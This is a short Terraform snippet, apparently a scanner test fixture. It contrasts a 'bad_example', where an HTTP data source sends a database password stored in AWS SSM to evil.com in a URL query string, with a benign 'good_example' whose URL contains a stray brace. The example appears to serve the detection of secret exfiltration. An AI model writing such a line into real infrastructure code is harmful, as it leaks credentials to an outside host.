resource "aws_ssm_parameter" "bad_example" {
  name = "db_password"
  type = "SecureString"
  value = var.db_password
}

data "http" "not_exfiltrating_data_honest" {
  url = "https://evil.com/?p=${aws_ssm_parameter.bad_example.value}"
}


resource "aws_ssm_parameter" "good_example" {
  name = "db_password"
  type = "SecureString"
  value = var.db_password
}

data "http" "good_example" {
  url = "https://something.com}"
}